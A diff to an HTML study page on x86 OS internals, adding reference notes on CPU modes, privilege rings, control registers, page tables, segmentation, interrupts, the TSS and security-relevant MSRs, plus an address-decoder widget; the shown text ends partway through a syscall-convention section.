@@ -35,6 +35,8 @@
     <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/prism.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-bash.min.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-c.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/prismjs@1.29.0/components/prism-nasm.min.js"></script>
     <!-- <link rel="stylesheet" href="https://unpkg.com/dracula-prism/dist/css/dracula-prism.css"> -->
     <link
       rel="stylesheet"
@@ -61,6 +63,138 @@
     <div class="content">
       <h1>x86 OS Internals</h1>
       <hr />
+
+      <div class="tab-container">
+        <div class="tab-buttons">
+          <button class="tab-btn active" data-tab="notes">Notes</button>
+          <button class="tab-btn" data-tab="lab">Lab</button>
+          <button class="tab-btn" data-tab="ctf">CTF Challenges</button>
+        </div>
+
+        <!-- NOTES TAB -->
+        <div class="tab-content active" id="notes">
+
+      <!-- ==================== PROCESSOR MODES ==================== -->
+      <h2>Processor Modes</h2>
+      <p>x86 CPUs support multiple operating modes, each defining the instruction set, addressing, and privilege model available.</p>
+
+      <table>
+        <tr><th>Mode</th><th>Bits</th><th>Addressing</th><th>Segments</th><th>Paging</th><th>Entry Condition</th></tr>
+        <tr><td><strong>Real Mode</strong></td><td>16-bit</td><td>20-bit (1 MB: segment×16 + offset)</td><td>Segment registers are paragraph addresses</td><td>No</td><td>Power-on default</td></tr>
+        <tr><td><strong>Protected Mode</strong></td><td>32-bit</td><td>32-bit (4 GB linear)</td><td>GDT/LDT descriptors with base + limit</td><td>Optional (CR0.PG)</td><td>Set CR0.PE = 1</td></tr>
+        <tr><td><strong>Long Mode</strong></td><td>64-bit</td><td>48/57-bit virtual, up to 52-bit physical</td><td>Flat (base=0, limit=max) except FS/GS</td><td>Required (4/5-level)</td><td>CR0.PG=1, CR4.PAE=1, EFER.LME=1</td></tr>
+        <tr><td><strong>Compatibility Mode</strong></td><td>32-bit</td><td>32-bit (sub-mode of Long Mode)</td><td>Legacy segment behavior</td><td>Yes (Long Mode tables)</td><td>CS descriptor L=0 in Long Mode</td></tr>
+        <tr><td><strong>Virtual-8086 Mode</strong></td><td>16-bit</td><td>20-bit (within Protected Mode)</td><td>Real-mode style segments</td><td>Yes (host PTs)</td><td>EFLAGS.VM=1 in Protected Mode</td></tr>
+        <tr><td><strong>System Management Mode (SMM)</strong></td><td>—</td><td>Flat 4 GB</td><td>Special (SMRAM)</td><td>Optional</td><td>SMI (hardware signal)</td></tr>
+      </table>
+
+      <h3>Mode Transitions</h3>
+      <pre><code class="language-none">Power On
+  │
+  ▼
+Real Mode (16-bit, 1 MB, no protection)
+  │  Set CR0.PE = 1, load GDT
+  ▼
+Protected Mode (32-bit, segments, rings)
+  │  Set CR4.PAE = 1, set EFER.LME = 1, set CR0.PG = 1
+  ▼
+Long Mode (64-bit, flat model, paging mandatory)
+  │
+  ├── 64-bit sub-mode:  CS.L = 1 (native 64-bit code)
+  └── Compatibility:    CS.L = 0 (run 32-bit code under 64-bit kernel)
+
+Any Mode ──SMI──▶ SMM ──RSM──▶ Previous Mode</code></pre>
+
+      <h3>Real Mode Details</h3>
+      <ul>
+        <li><strong>Address calculation</strong>: Physical = Segment Register × 16 + Offset (e.g., CS:IP → CS×16 + IP)</li>
+        <li><strong>No protection</strong>: any code can access any memory, any I/O port, any instruction</li>
+        <li><strong>IVT</strong>: Interrupt Vector Table at address 0x0000, 256 entries × 4 bytes (segment:offset pairs)</li>
+        <li><strong>Relevant for</strong>: BIOS boot code, bootkits, legacy boot sectors (0x7C00)</li>
+        <li><strong>A20 gate</strong>: address line 20 must be enabled to access &gt;1 MB; legacy wraparound behavior without it</li>
+      </ul>
+
+      <h3>Protected Mode Details</h3>
+      <ul>
+        <li><strong>GDT required</strong>: must set up Global Descriptor Table with at least null, code, and data segments before switching</li>
+        <li><strong>Privilege rings</strong>: 4 rings (0-3), enforced by segment descriptors and page tables</li>
+        <li><strong>Paging optional</strong>: CR0.PG enables paging; without it, linear = physical</li>
+        <li><strong>Hardware task switching</strong>: TSS-based (unused in modern OS, but TSS still required for stack switching)</li>
+      </ul>
+
+      <h3>Long Mode (IA-32e) Details</h3>
+      <ul>
+        <li><strong>Requirements</strong>: PAE paging + EFER.LME + CR0.PG all set simultaneously</li>
+        <li><strong>Segmentation mostly disabled</strong>: base forced to 0, limit ignored for CS/DS/ES/SS. Only <strong>FS</strong> and <strong>GS</strong> retain usable base (set via MSR: IA32_FS_BASE, IA32_GS_BASE)</li>
+        <li><strong>FS/GS usage</strong>: Linux kernel uses GS for per-CPU data (<code>gs:[0]</code> → KPCR/current task). Windows uses GS for TEB (user) / KPCR (kernel)</li>
+        <li><strong>Canonical addresses</strong>: bits 63:48 must be sign-extension of bit 47 (or 63:57 of bit 56 with LA57)</li>
+        <li><strong>RIP-relative addressing</strong>: default in 64-bit mode, enables position-independent code</li>
+      </ul>
+
+      <!-- ==================== PRIVILEGE RINGS ==================== -->
+      <h2>Privilege Rings</h2>
+
+      <pre><code class="language-none">┌─────────────────────────────────────────────────────────┐
+│                     Ring 3 (User Mode)                   │
+│   Applications, user-mode services                      │
+│   ┌─────────────────────────────────────────────────┐   │
+│   │              Ring 2 (unused)                     │   │
+│   │   ┌─────────────────────────────────────────┐   │   │
+│   │   │           Ring 1 (unused)               │   │   │
+│   │   │   ┌─────────────────────────────────┐   │   │   │
+│   │   │   │      Ring 0 (Kernel Mode)       │   │   │   │
+│   │   │   │  OS kernel, drivers             │   │   │   │
+│   │   │   └─────────────────────────────────┘   │   │   │
+│   │   └─────────────────────────────────────────┘   │   │
+│   └─────────────────────────────────────────────────┘   │
+└─────────────────────────────────────────────────────────┘
+
+         Ring -1:  Hypervisor (VMX root mode)
+         Ring -2:  SMM (System Management Mode)
+         Ring -3:  Intel ME / CSME</code></pre>
+
+      <h3>CPL, DPL, RPL</h3>
+      <table>
+        <tr><th>Acronym</th><th>Name</th><th>Where</th><th>Purpose</th></tr>
+        <tr><td><strong>CPL</strong></td><td>Current Privilege Level</td><td>CS register bits 1:0</td><td>The CPU's current ring. 0 = kernel, 3 = user</td></tr>
+        <tr><td><strong>DPL</strong></td><td>Descriptor Privilege Level</td><td>GDT/IDT entry</td><td>Maximum privilege level allowed to access this segment/gate</td></tr>
+        <tr><td><strong>RPL</strong></td><td>Requested Privilege Level</td><td>Segment selector bits 1:0</td><td>Overrides CPL for access checks (prevents kernel from using user-supplied selectors to bypass checks)</td></tr>
+      </table>
+
+      <h3>Privilege Level Checks</h3>
+      <pre><code class="language-none">Data Segment Access:   max(CPL, RPL) ≤ DPL
+Code Segment (far JMP): CPL = DPL (non-conforming) or CPL ≥ DPL (conforming)
+Call Gate:              max(CPL, RPL) ≤ gate DPL, and CPL ≥ target CS DPL
+Interrupt Gate (IDT):   CPL ≤ gate DPL (hardware interrupts bypass DPL check)
+I/O Ports:             CPL ≤ IOPL (or port enabled in TSS I/O bitmap)</code></pre>
+
+      <h3>Ring Transitions</h3>
+      <table>
+        <tr><th>Transition</th><th>Mechanism</th><th>Direction</th></tr>
+        <tr><td>Ring 3 → Ring 0</td><td><code>SYSCALL</code> / <code>SYSENTER</code> / <code>INT</code> / exception / interrupt</td><td>Into kernel (controlled entry points only)</td></tr>
+        <tr><td>Ring 0 → Ring 3</td><td><code>SYSRET</code> / <code>SYSEXIT</code> / <code>IRET</code></td><td>Return to user mode</td></tr>
+        <tr><td>Ring 0 → Ring -1</td><td><code>VMLAUNCH</code> / <code>VMRESUME</code></td><td>Enter VMX non-root (guest)</td></tr>
+        <tr><td>Ring -1 → Ring 0</td><td><code>VM-exit</code> (hardware trap to hypervisor)</td><td>Hardware event/instruction trap</td></tr>
+        <tr><td>Any → Ring -2</td><td>SMI (System Management Interrupt)</td><td>Hardware signal, transparent to software</td></tr>
+        <tr><td>Ring -2 → Previous</td><td><code>RSM</code></td><td>Resume from SMM</td></tr>
+      </table>
+
+      <h3>IOPL (I/O Privilege Level)</h3>
+      <ul>
+        <li>EFLAGS bits 13:12 — controls which ring can execute <code>IN</code>/<code>OUT</code>/<code>CLI</code>/<code>STI</code></li>
+        <li>If CPL &gt; IOPL, I/O instructions check the TSS I/O Permission Bitmap</li>
+        <li>If CPL ≤ IOPL, all I/O ports are accessible (typically only Ring 0 has IOPL=0)</li>
+        <li>Linux: <code>iopl(3)</code> or <code>ioperm()</code> syscalls grant user-mode I/O access (CAP_SYS_RAWIO)</li>
+      </ul>
+
+      <h3>Security Implications</h3>
+      <ul>
+        <li><strong>Ring 0 compromise</strong>: full system access — read/write all memory, load drivers, disable mitigations</li>
+        <li><strong>Ring -1 compromise</strong>: control all VMs + host — invisible to all guests. Blue Pill-style attacks</li>
+        <li><strong>Ring -2 compromise</strong>: persistent firmware implant — survives OS reinstall, disk wipe, even hypervisor</li>
+        <li><strong>Ring -3 compromise</strong>: Intel ME runs always — access to DRAM, network, crypto. Undetectable by any software</li>
+      </ul>
+
       <h2>CPUID</h2>
       <!-- . For a complete description of the CPUID instruction, tables indicating values
         returned, and example code, see CPUID—CPU Identification in Chapter 3 of the Intel® 64 and IA-32 Architectures
@@ -267,9 +401,9 @@
         </div>
       </div>
 
-      <!-- ECX and EDX Feature Flags - Always Visible -->
+      <!-- ECX and EDX Feature Flags -->
       <div class="cpuid-container">
-        <h4>ECX & EDX Feature Flags</h4>
+        <h4>ECX &amp; EDX Feature Flags</h4>
         <p class="cpuid-note">
           Enter the values you read from
           <span class="cpuid-kbd">ECX</span> and
@@ -287,34 +421,16 @@
               bin like <span class="cpuid-kbd">0b1010</span>)</label
             >
             <input id="ecxIn" placeholder="e.g., 0x7fbae3ff" />
-            <div class="cpuid-hint">
-              Common: <span class="cpuid-kbd">SSE3</span>,
-              <span class="cpuid-kbd">PCLMULQDQ</span>,
-              <span class="cpuid-kbd">SSSE3</span>,
-              <span class="cpuid-kbd">SSE4.1</span>,
-              <span class="cpuid-kbd">SSE4.2</span>,
-              <span class="cpuid-kbd">AES</span>,
-              <span class="cpuid-kbd">XSAVE/OSXSAVE</span>,
-              <span class="cpuid-kbd">AVX</span>,
-              <span class="cpuid-kbd">F16C</span>,
-              <span class="cpuid-kbd">RDRAND</span>,
-              <span class="cpuid-kbd">HYPERVISOR</span>.
-            </div>
           </div>
           <div class="cpuid-field">
-            <label for="edxIn">EDX value (hex/dec/bin)</label>
+            <label for="edxIn"
+              >EDX value</label
+            >
             <input id="edxIn" placeholder="e.g., 0xbfebfbff" />
-            <div class="cpuid-hint">
-              Classic: <span class="cpuid-kbd">FPU</span>,
-              <span class="cpuid-kbd">TSC</span>,
-              <span class="cpuid-kbd">MSR</span>,
-              <span class="cpuid-kbd">PAE</span>,
-              <span class="cpuid-kbd">CMOV</span>,
-              <span class="cpuid-kbd">MMX</span>,
-              <span class="cpuid-kbd">SSE/SSE2</span>,
-              <span class="cpuid-kbd">HTT</span>.
-            </div>
           </div>
+        </div>
+
+        <div class="cpuid-panel">
           <div class="cpuid-legend">
             <span class="cpuid-pill is-set">bit = 1 (feature present)</span>
             <span class="cpuid-pill is-clear">bit = 0 (feature absent)</span>
@@ -332,7 +448,1278 @@
         </div>
       </div>
 
-      <script></script>
+      <!-- ==================== CONTROL REGISTERS ==================== -->
+      <h2>Control Registers</h2>
+
+      <h3>CR0</h3>
+      <table>
+        <tr><th>Bit</th><th>Flag</th><th>Description</th></tr>
+        <tr><td>0</td><td>PE</td><td>Protected Mode Enable — switches from real mode to protected mode</td></tr>
+        <tr><td>1</td><td>MP</td><td>Monitor Coprocessor — controls interaction of WAIT/FWAIT with CR0.TS</td></tr>
+        <tr><td>2</td><td>EM</td><td>Emulation — set means no FPU present, FP instructions trigger #NM</td></tr>
+        <tr><td>3</td><td>TS</td><td>Task Switched — set on hardware task switch, controls lazy FPU context save</td></tr>
+        <tr><td>5</td><td>NE</td><td>Numeric Error — enables native FP error reporting</td></tr>
+        <tr><td>16</td><td><strong>WP</strong></td><td>Write Protect — when set, Ring 0 cannot write to read-only pages. <strong>Critical for security</strong> — clearing this bypasses copy-on-write and page protection</td></tr>
+        <tr><td>18</td><td>AM</td><td>Alignment Mask — enables alignment checking (with EFLAGS.AC)</td></tr>
+        <tr><td>29</td><td>NW</td><td>Not Write-through — disables write-through caching</td></tr>
+        <tr><td>30</td><td>CD</td><td>Cache Disable — disables memory caching entirely</td></tr>
+        <tr><td>31</td><td><strong>PG</strong></td><td>Paging — enables virtual memory translation via page tables</td></tr>
+      </table>
+
+      <h3>CR3 (Page Table Base)</h3>
+      <ul>
+        <li>Bits 51:12 = physical address of PML4 table (aligned to 4 KB)</li>
+        <li>Bit 4 = PCD (Page-level Cache Disable)</li>
+        <li>Bit 3 = PWT (Page-level Write-Through)</li>
+        <li>On context switch, CR3 is loaded with the new process's page table base → TLB flush (unless PCID is used)</li>
+        <li><strong>PCID</strong> (CR4.PCIDE): bits 11:0 of CR3 hold a 12-bit Process-Context Identifier. TLB entries are tagged with PCID, avoiding full flush on CR3 switch</li>
+      </ul>
+
+      <h3>CR4</h3>
+      <table>
+        <tr><th>Bit</th><th>Flag</th><th>Description</th></tr>
+        <tr><td>0</td><td>VME</td><td>Virtual-8086 Mode Extensions</td></tr>
+        <tr><td>2</td><td>TSD</td><td>Time Stamp Disable — RDTSC restricted to Ring 0 only</td></tr>
+        <tr><td>4</td><td>PSE</td><td>Page Size Extension — enables 4 MB pages (32-bit) / 2 MB pages (64-bit)</td></tr>
+        <tr><td>5</td><td>PAE</td><td>Physical Address Extension — enables 36-bit+ physical addresses, required for long mode</td></tr>
+        <tr><td>7</td><td>PGE</td><td>Page Global Enable — global pages not flushed on CR3 write (kernel pages)</td></tr>
+        <tr><td>11</td><td><strong>UMIP</strong></td><td>User-Mode Instruction Prevention — SGDT/SIDT/SLDT/SMSW fault in Ring 3</td></tr>
+        <tr><td>13</td><td>VMXE</td><td>VMX Enable — required for Intel VT-x virtualization</td></tr>
+        <tr><td>17</td><td><strong>PCIDE</strong></td><td>PCID Enable — enables process-context identifiers in TLB</td></tr>
+        <tr><td>18</td><td>OSXSAVE</td><td>XSAVE/XRSTOR and XSETBV/XGETBV instructions enabled</td></tr>
+        <tr><td>20</td><td><strong>SMEP</strong></td><td>Supervisor Mode Execution Prevention — Ring 0 cannot execute user-mode pages. Blocks ret2usr attacks</td></tr>
+        <tr><td>21</td><td><strong>SMAP</strong></td><td>Supervisor Mode Access Prevention — Ring 0 cannot read/write user-mode pages (unless EFLAGS.AC=1 via STAC/CLAC)</td></tr>
+        <tr><td>22</td><td>PKE</td><td>Protection Keys Enable — enables PKRU-based page access control</td></tr>
+        <tr><td>23</td><td>CET</td><td>Control-flow Enforcement Technology — shadow stack + indirect branch tracking</td></tr>
+      </table>
+
+      <h3>CR2</h3>
+      <p>Contains the <strong>faulting virtual address</strong> on a page fault (#PF). The CPU writes to CR2 before invoking the page fault handler.</p>
+
+      <h3>CR8 (TPR — Task Priority Register)</h3>
+      <p>x64 only. Controls the priority threshold for external interrupts. Used by the APIC to filter interrupts below the current priority level.</p>
+
+      <!-- ==================== PAGE TABLES ==================== -->
+      <h2>Page Tables (4-Level, x86-64)</h2>
+      <p>x86-64 uses 4-level paging (PML4) with 48-bit virtual addresses and up to 52-bit physical addresses. Each level is a 4 KB table of 512 entries (9 bits per level index).</p>
+
+      <pre><code class="language-none">Virtual Address (48-bit canonical):
+┌──────────┬───────────┬───────────┬───────────┬───────────┬─────────────┐
+│ Sign ext │  PML4     │  PDPT     │    PD     │    PT     │ Page Offset │
+│ (63:48)  │ (47:39)   │ (38:30)   │ (29:21)   │ (20:12)   │  (11:0)     │
+│ 16 bits  │  9 bits   │  9 bits   │  9 bits   │  9 bits   │  12 bits    │
+└──────────┴───────────┴───────────┴───────────┴───────────┴─────────────┘
+
+Translation Walk:
+CR3 ──→ PML4[idx] ──→ PDPT[idx] ──→ PD[idx] ──→ PT[idx] ──→ Physical Page + Offset
+
+Each table: 512 entries × 8 bytes = 4 KB page</code></pre>
+
+      <h3>Page Table Entry Format (PTE)</h3>
+      <table>
+        <tr><th>Bit(s)</th><th>Name</th><th>Description</th></tr>
+        <tr><td>0</td><td><strong>P</strong></td><td>Present — page is in physical memory</td></tr>
+        <tr><td>1</td><td><strong>R/W</strong></td><td>Read/Write — 0=read-only, 1=writable</td></tr>
+        <tr><td>2</td><td><strong>U/S</strong></td><td>User/Supervisor — 0=kernel only, 1=user accessible</td></tr>
+        <tr><td>3</td><td>PWT</td><td>Page-level Write-Through</td></tr>
+        <tr><td>4</td><td>PCD</td><td>Page-level Cache Disable</td></tr>
+        <tr><td>5</td><td>A</td><td>Accessed — set by CPU on read/write</td></tr>
+        <tr><td>6</td><td>D</td><td>Dirty — set by CPU on write</td></tr>
+        <tr><td>7</td><td>PS/PAT</td><td>Page Size (in PD: 1=2MB page) / PAT (in PT)</td></tr>
+        <tr><td>8</td><td>G</td><td>Global — not flushed from TLB on CR3 write</td></tr>
+        <tr><td>11:9</td><td>AVL</td><td>Available for OS use</td></tr>
+        <tr><td>51:12</td><td><strong>PFN</strong></td><td>Physical Frame Number (address of next table or physical page)</td></tr>
+        <tr><td>62:52</td><td>AVL</td><td>Available for OS use</td></tr>
+        <tr><td>63</td><td><strong>NX</strong></td><td>No-Execute — page cannot be executed (requires EFER.NXE=1)</td></tr>
+      </table>
+
+      <h3>Page Sizes</h3>
+      <table>
+        <tr><th>Size</th><th>Level</th><th>PS Bit</th><th>Use Case</th></tr>
+        <tr><td>4 KB</td><td>PT entry (level 1)</td><td>N/A</td><td>Default, fine-grained protection</td></tr>
+        <tr><td>2 MB</td><td>PD entry (level 2)</td><td>PD.PS=1</td><td>Large allocations, kernel text</td></tr>
+        <tr><td>1 GB</td><td>PDPT entry (level 3)</td><td>PDPT.PS=1</td><td>Huge pages, MMIO regions</td></tr>
+      </table>
+
+      <h3>5-Level Paging (PML5)</h3>
+      <p>Extends virtual address space to 57 bits (128 PB). Adds PML5 table above PML4. Enabled via CR4.LA57. Indices: PML5[56:48], PML4[47:39], PDPT[38:30], PD[29:21], PT[20:12], Offset[11:0].</p>
+
+      <h3 id="va-decoder">Virtual Address Decoder</h3>
+      <p class="cpuid-note">Enter a 64-bit virtual address to decode the page table indices for 4-level paging. Canonical addresses have bits 63:48 matching bit 47 (sign-extended).</p>
+      <div class="cpuid-container">
+        <div class="cpuid-panel cpuid-inputs">
+          <div class="cpuid-field">
+            <label for="vaInput">Virtual Address (hex)</label>
+            <input id="vaInput" placeholder="e.g., 0x00007FFE12345678" />
+          </div>
+        </div>
+        <div class="cpuid-panel">
+          <div class="cpuid-rowtitle">Page Table Indices</div>
+          <div class="version-info">
+            <div class="version-field"><label>Canonical:</label><span id="vaCanonical" class="version-value">—</span></div>
+            <div class="version-field"><label>PML4 [47:39]:</label><span id="vaPML4" class="version-value">—</span></div>
+            <div class="version-field"><label>PDPT [38:30]:</label><span id="vaPDPT" class="version-value">—</span></div>
+            <div class="version-field"><label>PD [29:21]:</label><span id="vaPD" class="version-value">—</span></div>
+            <div class="version-field"><label>PT [20:12]:</label><span id="vaPT" class="version-value">—</span></div>
+            <div class="version-field"><label>Offset [11:0]:</label><span id="vaOffset" class="version-value">—</span></div>
+          </div>
+        </div>
+        <div class="cpuid-panel">
+          <div class="cpuid-rowtitle">Bit Layout</div>
+          <div class="eax-layout">
+            <div class="bit-group"><div class="bit-label">Sign Ext (63:48)</div><div class="bit-value" id="vaSignBits">—</div></div>
+            <div class="bit-group"><div class="bit-label">PML4 (47:39)</div><div class="bit-value" id="vaPML4Bits">—</div></div>
+            <div class="bit-group"><div class="bit-label">PDPT (38:30)</div><div class="bit-value" id="vaPDPTBits">—</div></div>
+            <div class="bit-group"><div class="bit-label">PD (29:21)</div><div class="bit-value" id="vaPDBits">—</div></div>
+            <div class="bit-group"><div class="bit-label">PT (20:12)</div><div class="bit-value" id="vaPTBits">—</div></div>
+            <div class="bit-group"><div class="bit-label">Offset (11:0)</div><div class="bit-value" id="vaOffBits">—</div></div>
+          </div>
+        </div>
+        <div class="cpuid-panel">
+          <div class="cpuid-rowtitle">WinDbg / Linux Walk Commands</div>
+<pre><code class="language-bash"># WinDbg: auto page-table walk
+!pte &lt;virtual_address&gt;
+!vtop &lt;CR3&gt; &lt;virtual_address&gt;
+
+# Linux: translate via pagemap
+python3 -c "
+import struct, sys
+va = int(sys.argv[1], 16)
+f = open('/proc/self/pagemap','rb')
+f.seek((va >> 12) * 8)
+e = struct.unpack('Q', f.read(8))[0]
+pfn = e &amp; 0x7FFFFFFFFFFFFF
+print(f'PFN: {pfn:#x}  Phys: {(pfn &lt;&lt; 12) | (va &amp; 0xfff):#x}')
+" 0x7FFE12345678</code></pre>
+        </div>
+      </div>
+
+      <!-- ==================== SEGMENTATION ==================== -->
+      <h2>Segmentation</h2>
+      <p>In long mode (x86-64), segmentation is mostly flat (base=0, limit=max) but the GDT is still required for privilege level transitions and the TSS.</p>
+
+      <h3>Segment Selectors</h3>
+      <pre><code class="language-none">Selector format (16-bit value in CS, DS, SS, etc.):
+┌──────────────┬─────┬──────┐
+│ Index (15:3) │ TI  │ RPL  │
+│  13 bits     │ (2) │(1:0) │
+└──────────────┴─────┴──────┘
+TI:  0 = GDT, 1 = LDT
+RPL: Requested Privilege Level (0-3)</code></pre>
+
+      <h3>Common Selectors (x86-64)</h3>
+      <table>
+        <tr><th>Selector</th><th>Value</th><th>Description</th></tr>
+        <tr><td>Kernel CS</td><td>0x10</td><td>GDT index 2, Ring 0, code segment (L=1 for 64-bit)</td></tr>
+        <tr><td>Kernel DS</td><td>0x18</td><td>GDT index 3, Ring 0, data segment</td></tr>
+        <tr><td>User CS (32)</td><td>0x23</td><td>GDT index 4, Ring 3, 32-bit code (compat mode)</td></tr>
+        <tr><td>User DS</td><td>0x2B</td><td>GDT index 5, Ring 3, data segment</td></tr>
+        <tr><td>User CS (64)</td><td>0x33</td><td>GDT index 6, Ring 3, 64-bit code</td></tr>
+        <tr><td>TSS</td><td>0x40</td><td>GDT index 8, Task State Segment (16-byte descriptor)</td></tr>
+      </table>
+
+      <h3>GDT Entry Format (64-bit Code/Data)</h3>
+      <pre><code class="language-none">8-byte segment descriptor:
+┌────────┬──────┬─────┬──────┬──────────┬────────────┬──────────┐
+│Base    │Flags │Limit│Access│ Base     │ Limit      │ Base     │
+│(31:24) │G/D/L │(19:16)│Byte │(23:16)  │ (15:0)     │ (15:0)   │
+│ 8 bits │4 bits│4 bits│8 bits│ 8 bits  │ 16 bits    │ 16 bits  │
+└────────┴──────┴─────┴──────┴──────────┴────────────┴──────────┘
+
+Access Byte:
+  Bit 7: P (Present)
+  Bit 6-5: DPL (Descriptor Privilege Level, 0-3)
+  Bit 4: S (1=code/data, 0=system)
+  Bit 3: E (Executable: 1=code, 0=data)
+  Bit 2: DC (Direction/Conforming)
+  Bit 1: RW (Readable/Writable)
+  Bit 0: A (Accessed)
+
+Flags:
+  Bit 3: G (Granularity: 1=4KB, 0=1B)
+  Bit 2: D/B (Default size: 1=32-bit, 0=16-bit)
+  Bit 1: L (Long mode: 1=64-bit code segment)
+  Bit 0: AVL (Available for OS)</code></pre>
+
+      <!-- ==================== IDT ==================== -->
+      <h2>Interrupts &amp; Exceptions</h2>
+
+      <h3>Interrupt Descriptor Table (IDT)</h3>
+      <p>The IDT maps interrupt/exception vectors (0-255) to handler addresses. In 64-bit mode, each entry is 16 bytes.</p>
+
+      <h3>Key Vectors</h3>
+      <table>
+        <tr><th>Vector</th><th>Name</th><th>Type</th><th>Description</th></tr>
+        <tr><td>0</td><td>#DE</td><td>Fault</td><td>Divide Error</td></tr>
+        <tr><td>1</td><td>#DB</td><td>Fault/Trap</td><td>Debug Exception</td></tr>
+        <tr><td>2</td><td>NMI</td><td>Interrupt</td><td>Non-Maskable Interrupt</td></tr>
+        <tr><td>3</td><td>#BP</td><td>Trap</td><td>Breakpoint (INT 3) — used by debuggers</td></tr>
+        <tr><td>6</td><td>#UD</td><td>Fault</td><td>Undefined Opcode — invalid instruction</td></tr>
+        <tr><td>8</td><td>#DF</td><td>Abort</td><td>Double Fault — exception during exception handling (uses IST1)</td></tr>
+        <tr><td>13</td><td>#GP</td><td>Fault</td><td>General Protection — privilege violation, bad segment, etc.</td></tr>
+        <tr><td>14</td><td><strong>#PF</strong></td><td>Fault</td><td>Page Fault — address translation failed. Error code encodes R/W, U/S, P, NX violation. CR2 = faulting address</td></tr>
+        <tr><td>18</td><td>#MC</td><td>Abort</td><td>Machine Check — hardware error (uses IST3)</td></tr>
+        <tr><td>32-255</td><td>—</td><td>Interrupt</td><td>User-defined: IRQs, IPIs, APIC timer, syscall (INT 0x80 on Linux 32-bit)</td></tr>
+      </table>
+
+      <h3>Page Fault Error Code</h3>
+      <pre><code class="language-none">#PF Error Code (pushed on stack):
+  Bit 0 (P):    0 = non-present page, 1 = protection violation
+  Bit 1 (W/R):  0 = read access, 1 = write access
+  Bit 2 (U/S):  0 = supervisor mode, 1 = user mode
+  Bit 3 (RSVD): 1 = reserved bit set in PTE
+  Bit 4 (I/D):  1 = instruction fetch (NX violation)
+  Bit 5 (PK):   1 = protection key violation
+  Bit 6 (SS):   1 = shadow stack access
+  Bit 15 (SGX): 1 = SGX-related fault</code></pre>
+
+      <h3>IDT Gate Descriptor (64-bit)</h3>
+      <pre><code class="language-none">16-byte IDT entry:
+┌─────────────┬──────────────────────────────────────────────────┐
+│ Offset 63:32│ Reserved (must be 0)                             │
+├─────────────┼──────┬─────┬──────────┬──────┬──────────────────┤
+│ Offset 31:16│ Flags│ IST │ Reserved │ Type │ Segment Selector │
+├─────────────┴──────┴─────┴──────────┴──────┼──────────────────┤
+│ Offset 15:0                                │ Segment Selector │
+└────────────────────────────────────────────┴──────────────────┘
+
+Type: 0xE = Interrupt Gate (clears IF), 0xF = Trap Gate (IF unchanged)
+IST:  Interrupt Stack Table index (1-7). 0 = use legacy stack switch.
+      IST1 = #DF, IST2 = NMI, IST3 = #MC (separate stacks for safety)</code></pre>
+
+      <!-- ==================== TSS ==================== -->
+      <h2>Task State Segment (TSS)</h2>
+      <p>In 64-bit mode, the TSS is not used for hardware task switching. It provides:</p>
+      <ul>
+        <li><strong>RSP0</strong>: kernel stack pointer loaded on Ring 3 → Ring 0 transition (syscall/interrupt)</li>
+        <li><strong>RSP1, RSP2</strong>: stack pointers for other privilege levels (rarely used)</li>
+        <li><strong>IST1-IST7</strong>: Interrupt Stack Table — separate stacks for critical exceptions (#DF, NMI, #MC) to avoid stack corruption</li>
+        <li><strong>I/O Permission Bitmap</strong>: controls which I/O ports user-mode can access (IN/OUT instructions)</li>
+      </ul>
+
+      <pre><code class="language-none">TSS Layout (64-bit):
+Offset   Field
+0x00     Reserved
+0x04     RSP0 (Ring 0 stack — loaded on interrupt from Ring 3)
+0x0C     RSP1
+0x14     RSP2
+0x1C     Reserved
+0x24     IST1 (Double Fault stack)
+0x2C     IST2 (NMI stack)
+0x34     IST3 (Machine Check stack)
+0x3C     IST4-IST7
+0x5C     Reserved
+0x64     Reserved
+0x66     I/O Map Base Address</code></pre>
+
+      <!-- ==================== MSRs ==================== -->
+      <h2>Model-Specific Registers (MSRs)</h2>
+      <p>MSRs control CPU features not exposed via control registers. Accessed via <code>RDMSR</code>/<code>WRMSR</code> (Ring 0 only).</p>
+
+      <h3>Security-Critical MSRs</h3>
+      <table>
+        <tr><th>MSR</th><th>Address</th><th>Key Bits</th></tr>
+        <tr><td><strong>IA32_EFER</strong></td><td>0xC0000080</td><td>SCE (bit 0): SYSCALL enable. LME (bit 8): Long Mode Enable. <strong>NXE</strong> (bit 11): No-Execute page enable</td></tr>
+        <tr><td><strong>IA32_LSTAR</strong></td><td>0xC0000082</td><td>SYSCALL entry point — kernel loads RIP from here. Linux: <code>entry_SYSCALL_64</code>. Windows: <code>KiSystemCall64</code></td></tr>
+        <tr><td><strong>IA32_STAR</strong></td><td>0xC0000081</td><td>Bits 47:32 = kernel CS selector. Bits 63:48 = user CS selector (for SYSRET)</td></tr>
+        <tr><td><strong>IA32_FMASK</strong></td><td>0xC0000084</td><td>RFLAGS mask applied on SYSCALL — typically clears IF (interrupts disabled during entry)</td></tr>
+        <tr><td>IA32_KERNEL_GS_BASE</td><td>0xC0000102</td><td>Holds kernel GS base; swapped with user GS base via SWAPGS on syscall entry</td></tr>
+        <tr><td>IA32_SPEC_CTRL</td><td>0x48</td><td>IBRS (bit 0): Indirect Branch Restricted Speculation. STIBP (bit 1). SSBD (bit 2): Speculative Store Bypass Disable</td></tr>
+        <tr><td>IA32_TSC_AUX</td><td>0xC0000103</td><td>Auxiliary data returned by RDTSCP (usually holds processor ID)</td></tr>
+      </table>
+
+      <h3>SYSCALL/SYSRET Mechanics</h3>
+      <pre><code class="language-none">SYSCALL (Ring 3 → Ring 0):
+  1. RCX ← RIP (return address saved)
+  2. R11 ← RFLAGS (flags saved)
+  3. RFLAGS ← RFLAGS AND NOT IA32_FMASK
+  4. CS  ← IA32_STAR[47:32] (kernel code selector)
+  5. SS  ← IA32_STAR[47:32] + 8 (kernel data selector)
+  6. RIP ← IA32_LSTAR (syscall entry point)
+  *** NOTE: RSP is NOT changed by SYSCALL — kernel must swap stacks manually ***
+
+SYSRET (Ring 0 → Ring 3):
+  1. RIP ← RCX
+  2. RFLAGS ← R11
+  3. CS ← IA32_STAR[63:48] + 16 (user code selector)
+  4. SS ← IA32_STAR[63:48] + 8 (user data selector)
+
+Linux syscall convention (x86-64):
+  RAX = syscall number       RDI = arg1    RSI = arg2
+  RDX = arg3                 R10 = arg4    R8  = arg5
